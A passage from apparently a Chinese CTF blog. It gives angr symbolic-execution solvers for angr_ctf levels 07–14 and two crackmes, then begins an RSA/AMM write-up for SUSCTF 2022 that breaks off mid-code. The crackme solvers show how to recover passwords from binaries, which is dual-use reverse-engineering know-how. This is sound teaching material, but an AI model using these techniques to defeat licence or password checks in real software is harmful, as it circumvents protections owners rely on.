solution_state.solver.eval(password0,cast_to=bytes).decode() solution1 = solution_state.solver.eval(password1,cast_to=bytes).decode() solution = solution0+solution1 print(solution) else: raise Exception('Could not find the solution')if __name__ == '__main__': main(sys.argv) 07_angr_symbolic_file此题需要读取一个文件作为密码，因此我们需要利用angr的文件系统模拟出一个文件，从而进行符号化处理 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102# This challenge could, in theory, be solved in multiple ways. However, for the# sake of learning how to simulate an alternate filesystem, please solve this# challenge according to structure provided below. As a challenge, once you have# an initial solution, try solving this in an alternate way.## Problem description and general solution strategy:# The binary loads the password from a file using the fread function. If the# password is correct, it prints &quot;Good Job.&quot; In order to keep consistency with# the other challenges, the input from the console is written to a file in the # ignore_me function. As the name suggests, ignore it, as it only exists to# maintain consistency with other challenges.# We want to:# 1. Determine the file from which fread reads.# 2. Use Angr to simulate a filesystem where that file is replaced with our own# simulated file.# 3. Initialize the file with a symbolic value, which will be read with fread# and propogated through the program.# 4. Solve for the symbolic input to determine the password.import angrimport claripyimport sysdef main(argv): path_to_binary = '07_angr_symbolic_file' project = angr.Project(path_to_binary) start_address = 0x08049550 initial_state = project.factory.blank_state( addr=start_address, add_options = { angr.options.SYMBOL_FILL_UNCONSTRAINED_MEMORY, angr.options.SYMBOL_FILL_UNCONSTRAINED_REGISTERS} ) # Specify some information needed to construct a simulated file. For this # challenge, the filename is hardcoded, but in theory, it could be symbolic. # Note: to read from the file, the binary calls # 'fread(buffer, sizeof(char), 64, file)'. # (!) filename = 'KAZSUXSF.txt' # :string symbolic_file_size_bytes = 0x40 # Construct a bitvector for the password and then store it in the file's # backing memory. For example, imagine a simple file, 'hello.txt': # # Hello world, my name is John. # ^ ^ # ^ address 0 ^ address 24 (count the number of characters) # In order to represent this in memory, we would want to write the string to # the beginning of the file: # # hello_txt_contents = claripy.BVV('Hello world, my name is John.', 30*8) # # Perhaps, then, we would want to replace John with a # symbolic variable. We would call: # # name_bitvector = claripy.BVS('symbolic_name', 4*8) # # Then, after the program calls fopen('hello.txt', 'r') and then # fread(buffer, sizeof(char), 30, hello_txt_file), the buffer would contain # the string from the file, except four symbolic bytes where the name would be # stored. # (!) password = claripy.BVS('password', symbolic_file_size_bytes * 8) # Construct the symbolic file. The file_options parameter specifies the Linux # file permissions (read, read/write, execute etc.) The content parameter # specifies from where the stream of data should be supplied. If content is # an instance of SimSymbolicMemory (we constructed one above), the stream will # contain the contents (including any symbolic contents) of the memory, # beginning from address zero. # Set the content parameter to our BVS instance that holds the symbolic data. # (!) password_file = angr.storage.SimFile(filename, content=password) # Add the symbolic file we created to the symbolic filesystem. initial_state.fs.insert(filename, password_file) simulation = project.factory.simgr(initial_state) def is_successful(state): stdout_output = state.posix.dumps(sys.stdout.fileno()) return b'Good Job.' in stdout_output def should_abort(state): stdout_output = state.posix.dumps(sys.stdout.fileno()) return b'Try again.' in stdout_output simulation.explore(find=is_successful, avoid=should_abort) if simulation.found: solution_state = simulation.found[0] solution = solution_state.solver.eval(password,cast_to=bytes).decode() print(solution) else: raise Exception('Could not find the solution')if __name__ == '__main__': main(sys.argv) 08_angr_constraints通过添加约束解决路径爆炸问题 当一个程序存在循环结构时，即使逻辑十分简单也可能会产生规模十分巨大的执行路径。在符号执行的过程中，每个分支点都会产生两个实例，当程序中存在循环结构展开时，可能会导致程序分支路径数呈指数级增长，即路径爆炸问题。故我们需要提供更多的约束条件控制路径爆炸问题 为了避免路径爆炸，此题在完成求解时并不会进到check_equals_BMCCHUGEIQDYESGO函数中，而是在这之前停住，转而向求解得到的状态中添加约束，使约束向量等于最终的比较值，从而得到符合要求的输入。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108# The binary asks for a 16 character password to which is applies a complex# function and then compares with a reference string with the function# check_equals_[reference string]. (Decompile the binary and take a look at it!)# The source code for this function is provided here. However, the reference# string in your version will be different than AABBCCDDEEFFGGHH:## #define REFERENCE_PASSWORD = &quot;AABBCCDDEEFFGGHH&quot;;# int check_equals_AABBCCDDEEFFGGHH(char* to_check, size_t length) {# uint32_t num_correct = 0;# for (int i=0; i&lt;length; ++i) {# if (to_check[i] == REFERENCE_PASSWORD[i]) {# num_correct += 1;# }# }# return num_correct == length;# }## ...# # char* input = user_input();# char* encrypted_input = complex_function(input);# if (check_equals_AABBCCDDEEFFGGHH(encrypted_input, 16)) {# puts(&quot;Good Job.&quot;);# } else {# puts(&quot;Try again.&quot;);# }## The function checks if *to_check == &quot;AABBCCDDEEFFGGHH&quot;. Verify this yourself.# While you, as a human, can easily determine that this function is equivalent# to simply comparing the strings, the computer cannot. Instead the computer # would need to branch every time the if statement in the loop was called (16 # times), resulting in 2^16 = 65,536 branches, which will take too long of a # time to evaluate for our needs.## We do not know how the complex_function works, but we want to find an input# that, when modified by complex_function, will produce the string:# AABBCCDDEEFFGGHH.## In this puzzle, your goal will be to stop the program before this function is# called and manually constrain the to_check variable to be equal to the# password you identify by decompiling the binary. Since, you, as a human, know# that if the strings are equal, the program will print &quot;Good Job.&quot;, you can# be assured that if the program can solve for an input that makes them equal,# the input will be the correct password.import angrimport claripyimport sysdef main(argv): path_to_binary = '08_angr_constraints' project = angr.Project(path_to_binary) start_address = 0x0804935d initial_state = project.factory.blank_state( addr=start_address, add_options = { angr.options.SYMBOL_FILL_UNCONSTRAINED_MEMORY, angr.options.SYMBOL_FILL_UNCONSTRAINED_REGISTERS} ) password = claripy.BVS('password', 128) password_address = 0x0804c040 initial_state.memory.store(password_address, password) simulation = project.factory.simgr(initial_state) # Angr will not be able to reach the point at which the binary prints out # 'Good Job.'. We cannot use that as the target anymore. # (!) address_to_check_constraint = 0x080493a9 simulation.explore(find=address_to_check_constraint) if simulation.found: solution_state = simulation.found[0] # Recall that we need to constrain the to_check parameter (see top) of the # check_equals_ function. Determine the address that is being passed as the # parameter and load it into a bitvector so that we can constrain it. # (!) constrained_parameter_address = 0x0804c040 constrained_parameter_size_bytes = 16 constrained_parameter_bitvector = solution_state.memory.load( constrained_parameter_address, constrained_parameter_size_bytes ) # We want to constrain the system to find an input that will make # constrained_parameter_bitvector equal the desired value. # (!) constrained_parameter_desired_value = 'BMCCHUGEIQDYESGO' # :string (encoded) # Specify a claripy expression (using Pythonic syntax) that tests whether # constrained_parameter_bitvector == constrained_parameter_desired_value. # Add the constraint to the state to let z3 attempt to find an input that # will make this expression true. solution_state.add_constraints(constrained_parameter_bitvector == constrained_parameter_desired_value) # Solve for the constrained_parameter_bitvector. # (!) solution = solution_state.solver.eval(password,cast_to=bytes) print(solution) else: raise Exception('Could not find the solution')if __name__ == '__main__': main(sys.argv) 09_angr_hooks学习使用angr的hook技术解决路径爆炸问题 钩子编程（hooking），也称作“挂钩”，是计算机程序设计术语，指通过拦截软件模块间的函数调用、消息传递、事件传递来修改或扩展操作系统、应用程序或其他软件组件的行为的各种技术。处理被拦截的函数调用、事件、消息的代码，被称为钩子（hook）。 简单来说就是用我们自己设计的函数去取代被hook的函数 在本题中需要用自己设计的skip_check_equals函数替代check_equals_函数 注意user_input_buffer_length要设置正确 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899# This level performs the following computations:## 1. Get 16 bytes of user input and encrypt it.# 2. Save the result of check_equals_AABBCCDDEEFFGGHH (or similar)# 3. Get another 16 bytes from the user and encrypt it.# 4. Check that it's equal to a predefined password.## The ONLY part of this program that we have to worry about is #2. We will be# replacing the call to check_equals_ with our own version, using a hook, since# check_equals_ will run too slowly otherwise.import angrimport claripyimport sysdef main(argv): path_to_binary = '09_angr_hooks' project = angr.Project(path_to_binary) # Since Angr can handle the initial call to scanf, we can start from the # beginning. initial_state = project.factory.entry_state( add_options = { angr.options.SYMBOL_FILL_UNCONSTRAINED_MEMORY, angr.options.SYMBOL_FILL_UNCONSTRAINED_REGISTERS} ) # Hook the address of where check_equals_ is called. # (!) check_equals_called_address = 0x080493ce # The length parameter in angr.Hook specifies how many bytes the execution # engine should skip after completing the hook. This will allow hooks to # replace certain instructions (or groups of instructions). Determine the # instructions involved in calling check_equals_, and then determine how many # bytes are used to represent them in memory. This will be the skip length. # (!) instruction_to_skip_length = 5 @project.hook(check_equals_called_address, length=instruction_to_skip_length) def skip_check_equals_(state): # Determine the address where user input is stored. It is passed as a # parameter ot the check_equals_ function. Then, load the string. Reminder: # int check_equals_(char* to_check, int length) { ... user_input_buffer_address = 0x0804c044 # :integer, probably hexadecimal user_input_buffer_length = 0x10 # Reminder: state.memory.load will read the stored value at the address # user_input_buffer_address of byte length user_input_buffer_length. # It will return a bitvector holding the value. This value can either be # symbolic or concrete, depending on what was stored there in the program. user_input_string = state.memory.load( user_input_buffer_address, user_input_buffer_length ) # Determine the string this function is checking the user input against. # It's encoded in the name of this function; decompile the program to find # it. check_against_string = 'DOQTDXIUESUOZCMW' # :string # gcc uses eax to store the return value, if it is an integer. We need to # set eax to 1 if check_against_string == user_input_string and 0 otherwise. # However, since we are describing an equation to be used by z3 (not to be # evaluated immediately), we cannot use Python if else syntax. Instead, we # have to use claripy's built in function that deals with if statements. # claripy.If(expression, ret_if_true, ret_if_false) will output an # expression that evaluates to ret_if_true if expression is true and # ret_if_false otherwise. # Think of it like the Python &quot;value0 if expression else value1&quot;. state.regs.eax = claripy.If( user_input_string == check_against_string, claripy.BVV(1, 32), claripy.BVV(0, 32) ) simulation = project.factory.simgr(initial_state) def is_successful(state): stdout_output = state.posix.dumps(sys.stdout.fileno()) return b'Good Job.' in stdout_output def should_abort(state): stdout_output = state.posix.dumps(sys.stdout.fileno()) return b'Try again.' in stdout_output simulation.explore(find=is_successful, avoid=should_abort) if simulation.found: solution_state = simulation.found[0] # Since we are allowing Angr to handle the input, retrieve it by printing # the contents of stdin. Use one of the early levels as a reference. solution = solution_state.posix.dumps(sys.stdin.fileno()) print(solution) else: raise Exception('Could not find the solution')if __name__ == '__main__': main(sys.argv) 10_angr_simprocedures看一下这丧心病狂函数调用图，发现check_equals_ 这个函数被调用了很多次 这里通过函数名来hook函数，通过hook_symbol来实现 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117# This challenge is similar to the previous one. It operates under the same# premise that you will have to replace the check_equals_ function. In this# case, however, check_equals_ is called so many times that it wouldn't make# sense to hook where each one was called. Instead, use a SimProcedure to write# your own check_equals_ implementation and then hook the check_equals_ symbol# to replace all calls to scanf with a call to your SimProcedure.## You may be thinking:# Why can't I just use hooks? The function is called many times, but if I hook# the address of the function itself (rather than the addresses where it is# called), I can replace its behavior everywhere. Furthermore, I can get the# parameters by reading them off the stack (with memory.load(regs.esp + xx)),# and return a value by simply setting eax! Since I know the length of the# function in bytes, I can return from the hook just before the 'ret'# instruction is called, which will allow the program to jump back to where it# was before it called my hook.# If you thought that, then congratulations! You have just invented the idea of# SimProcedures! Instead of doing all of that by hand, you can let the already-# implemented SimProcedures do the boring work for you so that you can focus on# writing a replacement function in a Pythonic way.# As a bonus, SimProcedures allow you to specify custom calling conventions, but# unfortunately it is not covered in this CTF.import angrimport claripyimport sysdef main(argv): path_to_binary = '10_angr_simprocedures' project = angr.Project(path_to_binary) initial_state = project.factory.entry_state( add_options = { angr.options.SYMBOL_FILL_UNCONSTRAINED_MEMORY, angr.options.SYMBOL_FILL_UNCONSTRAINED_REGISTERS} ) # Define a class that inherits angr.SimProcedure in order to take advantage # of Angr's SimProcedures. class ReplacementCheckEquals(angr.SimProcedure): # A SimProcedure replaces a function in the binary with a simulated one # written in Python. Other than it being written in Python, the function # acts largely the same as any function written in C. Any parameter after # 'self' will be treated as a parameter to the function you are replacing. # The parameters will be bitvectors. Additionally, the Python can return in # the ususal Pythonic way. Angr will treat this in the same way it would # treat a native function in the binary returning. An example: # # int add_if_positive(int a, int b) { # if (a &gt;= 0 &amp;&amp; b &gt;= 0) return a + b; # else return 0; # } # # could be simulated with... # # class ReplacementAddIfPositive(angr.SimProcedure): # def run(self, a, b): # if a &gt;= 0 and b &gt;=0: # return a + b # else: # return 0 # # Finish the parameters to the check_equals_ function. Reminder: # int check_equals_AABBCCDDEEFFGGHH(char* to_check, int length) { ... # (!) def run(self, to_check, len): # We can almost copy and paste the solution from the previous challenge. # Hint: Don't look up the address! It's passed as a parameter. # (!) user_input_buffer_address = to_check user_input_buffer_length = len # Note the use of self.state to find the state of the system in a # SimProcedure. user_input_string = self.state.memory.load( user_input_buffer_address, user_input_buffer_length ) check_against_string = 'WXMXMQFENIXLIZMK' # Finally, instead of setting eax, we can use a Pythonic return statement # to return the output of this function. # Hint: Look at the previous solution. return claripy.If(check_against_string==user_input_string, claripy.BVV(1,32), claripy.BVV(0,32)) # Hook the check_equals symbol. Angr automatically looks up the address # associated with the symbol. Alternatively, you can use 'hook' instead # of 'hook_symbol' and specify the address of the function. To find the # correct symbol, disassemble the binary. # (!) check_equals_symbol = 'check_equals_WXMXMQFENIXLIZMK' # :string project.hook_symbol(check_equals_symbol, ReplacementCheckEquals()) simulation = project.factory.simgr(initial_state) def is_successful(state): stdout_output = state.posix.dumps(sys.stdout.fileno()) return b'Good Job.' in stdout_output def should_abort(state): stdout_output = state.posix.dumps(sys.stdout.fileno()) return b'Try again.' in stdout_output simulation.explore(find=is_successful, avoid=should_abort) if simulation.found: solution_state = simulation.found[0] solution = solution_state.posix.dumps(sys.stdin.fileno()) print(solution) else: raise Exception('Could not find the solution')if __name__ == '__main__': main(sys.argv) 11_angr_sim_scanf利用上一题学到的hook知识去hook scanf函数 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667# This time, the solution involves simply replacing scanf with our own version,# since Angr does not support requesting multiple parameters with scanf.import angrimport claripyimport sysdef main(argv): path_to_binary = '11_angr_sim_scanf' project = angr.Project(path_to_binary) initial_state = project.factory.entry_state( add_options = { angr.options.SYMBOL_FILL_UNCONSTRAINED_MEMORY, angr.options.SYMBOL_FILL_UNCONSTRAINED_REGISTERS} ) class ReplacementScanf(angr.SimProcedure): # Finish the parameters to the scanf function. Hint: 'scanf(&quot;%u %u&quot;, ...)'. # (!) def run(self, format_string, scanf0_address, scanf1_address): # Hint: scanf0_address is passed as a parameter, isn't it? scanf0 = claripy.BVS('scanf0', 32) scanf1 = claripy.BVS('scanf1', 32) # The scanf function writes user input to the buffers to which the # parameters point. self.state.memory.store(scanf0_address, scanf0, endness=project.arch.memory_endness) self.state.memory.store(scanf1_address, scanf1, endness=project.arch.memory_endness) # Now, we want to 'set aside' references to our symbolic values in the # globals plugin included by default with a state. You will need to # store multiple bitvectors. You can either use a list, tuple, or multiple # keys to reference the different bitvectors. # (!) self.state.globals['solution0'] = scanf0 self.state.globals['solution1'] = scanf1 scanf_symbol = '__isoc99_scanf' project.hook_symbol(scanf_symbol, ReplacementScanf()) simulation = project.factory.simgr(initial_state) def is_successful(state): stdout_output = state.posix.dumps(sys.stdout.fileno()) return b'Good Job.' in stdout_output def should_abort(state): stdout_output = state.posix.dumps(sys.stdout.fileno()) return b'Try again.' in stdout_output simulation.explore(find=is_successful, avoid=should_abort) if simulation.found: solution_state = simulation.found[0] # Grab whatever you set aside in the globals dict. stored_solutions0 = solution_state.solver.eval(solution_state.globals['solution0']) stored_solutions1 = solution_state.solver.eval(solution_state.globals['solution1']) solution = str(stored_solutions0)+' '+str(stored_solutions1) print(solution) else: raise Exception('Could not find the solution')if __name__ == '__main__': main(sys.argv) 12_angr_veritesting利用Veritesting来解决路径爆炸问题 动态符号执行（DSE）和静态符号执行（SSE）一个为路径生成公式，一个为语句生成公式。前者生成公式时会产生很高的负载，但生成的公式很容易解；后者生成公式很容易，公式也能覆盖更多的路径，但是公式更长更难解。方法上的区别在于DSE会摘要路径汇合点上两条分支的情况，而SSE为两条分支fork两条独立的执行路径 SSE目前还不能对大规模的程序分析（如Cloud9+state merging），问题主要在于循环的表示、方程复杂度、缺少具体状态、和对syscall等的模拟。Veritesting可以在SSE和DSE之间切换，减少负载和公式求解难度，并解决静态方法需要摘要或其他方法才能处理的系统调用和间接跳转 简单来说就是Veritesting结合了静态符合执行与动态符号执行，减少了路径爆炸的影响，在angr里我们只要在构造模拟管理器时，启用Veritesting了就行 1project.factory.simgr(initial_state, veritesting=True) 1234567891011121314151617181920212223242526272829303132333435363738394041# When you construct a simulation manager, you will want to enable Veritesting:# project.factory.simgr(initial_state, veritesting=True)# Hint: use one of the first few levels' solutions as a reference.import angr import claripyimport sysdef main(argv): path_to_binary = '12_angr_veritesting' project = angr.Project(path_to_binary) initial_state = project.factory.entry_state( add_options = { angr.options.SYMBOL_FILL_UNCONSTRAINED_MEMORY, angr.options.SYMBOL_FILL_UNCONSTRAINED_REGISTERS} ) simulation = project.factory.simgr(initial_state,veritesting=True) def is_successful(state): stdout_output = state.posix.dumps(sys.stdout.fileno()) return b'Good Job.' in stdout_output def should_abort(state): stdout_output = state.posix.dumps(sys.stdout.fileno()) return b'Try again.' in stdout_output simulation.explore(find=is_successful, avoid=should_abort) if simulation.found: solution_state = simulation.found[0] solution = solution_state.posix.dumps(sys.stdin.fileno()).decode() print(solution) else: raise Exception('Could not find the solution')if __name__ == '__main__': main(sys.argv) 13_angr_static_binary拖进IDA后可以发现，文件是静态编译的，此时需要利用angr提供的函数hook掉静态库里的函数 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273# This challenge is the exact same as the first challenge, except that it was# compiled as a static binary. Normally, Angr automatically replaces standard# library functions with SimProcedures that work much more quickly.## To solve the challenge, manually hook any standard library c functions that# are used. Then, ensure that you begin the execution at the beginning of the# main function. Do not use entry_state.## Here are a few SimProcedures Angr has already written for you. They implement# standard library functions. You will not need all of them:# angr.SIM_PROCEDURES['libc']['malloc']# angr.SIM_PROCEDURES['libc']['fopen']# angr.SIM_PROCEDURES['libc']['fclose']# angr.SIM_PROCEDURES['libc']['fwrite']# angr.SIM_PROCEDURES['libc']['getchar']# angr.SIM_PROCEDURES['libc']['strncmp']# angr.SIM_PROCEDURES['libc']['strcmp']# angr.SIM_PROCEDURES['libc']['scanf']# angr.SIM_PROCEDURES['libc']['printf']# angr.SIM_PROCEDURES['libc']['puts']# angr.SIM_PROCEDURES['libc']['exit']## As a reminder, you can hook functions with something similar to:# project.hook(malloc_address, angr.SIM_PROCEDURES['libc']['malloc']())## There are many more, see:# https://github.com/angr/angr/tree/master/angr/procedures/libc## Additionally, note that, when the binary is executed, the main function is not# the first piece of code called. In the _start function, __libc_start_main is# called to start your program. The initialization that occurs in this function# can take a long time with Angr, so you should replace it with a SimProcedure.# angr.SIM_PROCEDURES['glibc']['__libc_start_main']# Note 'glibc' instead of 'libc'.import angrimport sysdef main(argv): path_to_binary = '13_angr_static_binary' # :string project = angr.Project(path_to_binary) initial_state = project.factory.blank_state( addr=0x08049e1f, add_options = { angr.options.SYMBOL_FILL_UNCONSTRAINED_MEMORY, angr.options.SYMBOL_FILL_UNCONSTRAINED_REGISTERS} ) # project.hook(0x0804a250,angr.SIM_PROCEDURES['glibc']['__libc_start_main']()) project.hook(0x08051340,angr.SIM_PROCEDURES['libc']['scanf']()) project.hook(0x080512f0,angr.SIM_PROCEDURES['libc']['printf']()) project.hook(0x0805ec90,angr.SIM_PROCEDURES['libc']['puts']()) project.hook(0x080490d0,angr.SIM_PROCEDURES['libc']['strcmp']()) project.hook(0x08050800,angr.SIM_PROCEDURES['libc']['exit']()) simulation = project.factory.simgr(initial_state) print_good_address = 0x08049f06 # :integer (probably in hexadecimal) simulation.explore(find=print_good_address) if simulation.found: solution_state = simulation.found[0] print(solution_state.posix.dumps(sys.stdin.fileno()).decode()) else: raise Exception('Could not find the solution')if __name__ == '__main__': main(sys.argv) 14_angr_shared_library拖进IDA，可以发现关键函数validate属于外部库 此时通过加载.so文件可以求解问题，这时需要指定基地址 123456base = 0x08048000project = angr.Project(path_to_binary, load_options={ 'main_opts' : { 'base_addr' : base }}) 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879# The shared library has the function validate, which takes a string and returns# either true (1) or false (0). The binary calls this function. If it returns# true, the program prints &quot;Good Job.&quot; otherwise, it prints &quot;Try again.&quot;## Note: When you run this script, make sure you run it on# lib14_angr_shared_library.so, not the executable. This level is intended to# teach how to analyse binary formats that are not typical executables.import angrimport claripyimport sysdef main(argv): path_to_binary = 'lib14_angr_shared_library.so' # The shared library is compiled with position-independent code. You will need # to specify the base address. All addresses in the shared library will be # base + offset, where offset is their address in the file. # (!) base = 0x08048000 project = angr.Project(path_to_binary, load_options={ 'main_opts' : { 'base_addr' : base } }) # Initialize any symbolic values here; you will need at least one to pass to # the validate function. # (!) buffer_pointer = claripy.BVV(0x10000000, 32) # Begin the state at the beginning of the validate function, as if it was # called by the program. Determine the parameters needed to call validate and # replace 'parameters...' with bitvectors holding the values you wish to pass. # Recall that 'claripy.BVV(value, size_in_bits)' constructs a bitvector # initialized to a single value. # Remember to add the base value you specified at the beginning to the # function address! # Hint: int validate(char* buffer, int length) { ... # (!) validate_function_address = base + 0x129c initial_state = project.factory.call_state( validate_function_address, buffer_pointer, claripy.BVV(8,32) ) # Inject a symbolic value for the password buffer into the program and # instantiate the simulation. Another hint: the password is 8 bytes long. # (!) password = claripy.BVS( 'password', 64 ) initial_state.memory.store( buffer_pointer , password) simulation = project.factory.simgr(initial_state) # We wish to reach the end of the validate function and constrain the # return value of the function (stored in eax) to equal true (value of 1) # just before the function returns. We could use a hook, but instead we # can search for the address just before the function returns and then # constrain eax # (!) check_constraint_address = base + 0x134c simulation.explore(find=check_constraint_address) if simulation.found: solution_state = simulation.found[0] # Determine where the program places the return value, and constrain it so # that it is true. Then, solve for the solution and print it. # (!) solution_state.add_constraints( solution_state.regs.eax!=0 ) solution = solution_state.solver.eval(password,cast_to=bytes) print(solution) else: raise Exception('Could not find the solution')if __name__ == '__main__': main(sys.argv) 15_angr_arbitrary_read16_angr_arbitrary_write17_angr_arbitrart_jump题目 from 各类比赛部分来源 angr-doc/examples at master · angr/angr-doc (github.com) [WUSTCTF2020]funnyre去掉花指令后： 123456789101112131415161718192021222324252627282930313233343536373839404142434445import angrimport claripyimport sysdef main(argv): path_to_binary = 'attachment' project = angr.Project(path_to_binary) start_address = 0x4005d9 initial_state = project.factory.blank_state( addr=start_address, add_options = { angr.options.SYMBOL_FILL_UNCONSTRAINED_MEMORY, angr.options.SYMBOL_FILL_UNCONSTRAINED_REGISTERS} ) password0 = claripy.BVS('password0', 8*38) password0_address = initial_state.regs.rdx initial_state.memory.store(password0_address, password0) simulation = project.factory.simgr(initial_state) simulation.explore(find=0x401dae, avoid=0x401da2) if simulation.found: solution_state = simulation.found[0] # Solve for the symbolic values. We are trying to solve for a string. # Therefore, we will use eval, with named parameter cast_to=bytes # which returns bytes that can be decoded to a string instead of an integer. # (!) solution0 = solution_state.solver.eval(password0,cast_to=bytes).decode() solution = solution0 print(solution) else: raise Exception('Could not find the solution')if __name__ == '__main__': main(sys.argv) [ais3_crackme]12345678910111213141516171819202122232425262728293031323334353637383940414243#!/usr/bin/env python'''ais3_crackme has been developed by Tyler Nighswander (tylerni7) for ais3.It is an easy crackme challenge. It checks the command line argument.'''import angrimport claripydef main(): project = angr.Project(&quot;./ais3_crackme&quot;, auto_load_libs=False) #create an initial state with a symbolic bit vector as argv1 argv1 = claripy.BVS(&quot;argv1&quot;,100*8) #since we do not the length now, we just put 100 bytes initial_state = project.factory.entry_state(args=[&quot;./crackme1&quot;,argv1]) #create a path group using the created initial state sm = project.factory.simulation_manager(initial_state) #symbolically execute the program until we reach the wanted value of the instruction pointer sm.explore(find=0x400602) #at this instruction the binary will print(the &quot;correct&quot; message) found = sm.found[0] #ask to the symbolic solver to get the value of argv1 in the reached state as a string solution = found.solver.eval(argv1, cast_to=bytes) print(repr(solution)) solution = solution[:solution.find(b&quot;\\x00&quot;)] print(solution) return solutiondef test(): res = main() assert res == b&quot;ais3{I_tak3_g00d_n0t3s}&quot;if __name__ == '__main__': print(repr(main())) 参考资料 5.3 符号执行 · CTF All In One (gitbooks.io) 5.3.1 angr · CTF All In One (gitbooks.io) README - angr Documentation AngrCTF_FITM/笔记 at master · ZERO-A-ONE/AngrCTF_FITM (github.com)","link":"/2022/05/09/Reverse-angr/"},{"title":"SUSCTF2022 large case","text":"[SUSCTF 2022 Crypto]large case记录一道因为忽视填充长度而无法做出的题目（real problem:菜） 题目： 123456789101112131415161718192021222324from Crypto.Util.number import *from secret import e,messagedef pad(s): if len(s)&lt;3*L: s+=bytes(3*L-len(s)) return sL=128p=127846753573603084140032502367311687577517286192893830888210505400863747960458410091624928485398237221748639465569360357083610343901195273740653100259873512668015324620239720302434418836556626441491996755736644886234427063508445212117628827393696641594389475794455769831224080974098671804484986257952189021223q=145855456487495382044171198958191111759614682359121667762539436558951453420409098978730659224765186993202647878416602503196995715156477020462357271957894750950465766809623184979464111968346235929375202282811814079958258215558862385475337911665725569669510022344713444067774094112542265293776098223712339100693r=165967627827619421909025667485886197280531070386062799707570138462960892786375448755168117226002965841166040777799690060003514218907279202146293715568618421507166624010447447835500614000601643150187327886055136468260391127675012777934049855029499330117864969171026445847229725440665179150874362143944727374907n=p*q*rassert isPrime(GCD(e,p-1)) and isPrime(GCD(e,q-1)) and isPrime(GCD(e,r-1)) and e==GCD(e,p-1)*GCD(e,q-1)*GCD(e,r-1)assert len(message)&gt;L and len(message)&lt;2*Lassert b'SUSCTF' in messagem=bytes_to_long(pad(message))c=pow(m,e,n)print(c)'''2832775557487418816663494645849097066925967799754895979829784499040437385450603537732862576495758207240632734290947928291961063611897822688909447511260639429367768479378599532712621774918733304857247099714044615691877995534173849302353620399896455615474093581673774297730056975663792651743809514320379189748228186812362112753688073161375690508818356712739795492736743994105438575736577194329751372142329306630950863097761601196849158280502041616545429586870751042908365507050717385205371671658706357669408813112610215766159761927196639404951251535622349916877296956767883165696947955379829079278948514755758174884809479690995427980775293393456403529481055942899970158049070109142310832516606657100119207595631431023336544432679282722485978175459551109374822024850128128796213791820270973849303929674648894135672365776376696816104314090776423931007123128977218361110636927878232444348690591774581974226318856099862175526133892''' 在factordb.com上分解p-1、q-1、r-1，猜测e_p=757,e_q=66553,e_r=5156273（别问我为啥这样猜，因为玄学） 或者参考dl的得法： 1234567891011121314for i in primefac(int(p-1)): if pow(c,(p-1)//i,p)==1: ep=i breakfor i in primefac(int(q-1)): if pow(c,(q-1)//i,q)==1: eq=i breakfor i in primefac(int(r-1)): if pow(c,(r-1)//i,r)==1: er=i breakep,eq,er=757,66553,5156273e=ep*eq*er 既然指明了 $GCD(e,\\phi(n))\\neq 1$ ，那么就大概可以推测出使用AMM算法了 然而问题是 $e_r$ 过大，算不了。那么如何绕过它呢？ 答案是利用题目中message填充长度过大： 令M为原消息，m为填充后消息： c=m^e\\ mod\\ n\\\\ c'=M^e\\ mod\\ n\\\\ M=m>>1024则 c'=M^e=(m>>1024)^e=\\frac{m^e}{ {2^{1024} }^e}=\\frac{c}{ {2^{1024} }^e}\\ mod\\ n原来所求问题： m^e=c+k_1pqr转化为： M^e=c'+k_2pqr=c'+k_3pq此后则可以利用AMM算法和中国剩余定理得到flag了： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677from Crypto.Util.number import *import gmpy2import randomfrom Algorithm import crtimport sympydef rth_root(cip,r,q): &quot;&quot;&quot; cip^r==q &amp;&amp; r|q-1 &quot;&quot;&quot; rnum=random.randint(1,q) while (pow(rnum,(q-1)//r,q)==1): rnum=random.randint(1,q) t=1 while((q-1)%pow(r,t)==0): t+=1 t-=1 s=(q-1)//pow(r,t) k = 1 while (k * s + 1) % r != 0: k += 1 alpha = (k * s + 1) // r a=pow(rnum,pow(r,t-1)*s,q) b=pow(cip,r*alpha-1,q) c=pow(rnum,s,q) h=1 print('t='+str(t)) for i in range(1,t): # print('1213') d=pow(b,pow(r,t-1-i),q) if d==1: j=0 else: j=(-sympy.discrete_log(q,d,a))%q b=b*(pow(pow(c,r,q),j,q))%q h=h*pow(c,j,q)%q c=pow(c,r,q)%q return pow(cip,alpha,q)*h%qdef findAllPRoot(root,p,e): maySolve=[root] while(len(maySolve)&lt;e): maySolve.append(root*pow(random.randint(2,p-1),(p-1)//e,p)%p) print('finish') return maySolvep=127846753573603084140032502367311687577517286192893830888210505400863747960458410091624928485398237221748639465569360357083610343901195273740653100259873512668015324620239720302434418836556626441491996755736644886234427063508445212117628827393696641594389475794455769831224080974098671804484986257952189021223q=145855456487495382044171198958191111759614682359121667762539436558951453420409098978730659224765186993202647878416602503196995715156477020462357271957894750950465766809623184979464111968346235929375202282811814079958258215558862385475337911665725569669510022344713444067774094112542265293776098223712339100693r=165967627827619421909025667485886197280531070386062799707570138462960892786375448755168117226002965841166040777799690060003514218907279202146293715568618421507166624010447447835500614000601643150187327886055136468260391127675012777934049855029499330117864969171026445847229725440665179150874362143944727374907p_e=757q_e=66553r_e=5156273n=p*q*re=p_e*q_e*r_eassert isPrime(GCD(e,p-1)) and isPrime(GCD(e,q-1)) and isPrime(GCD(e,r-1)) and 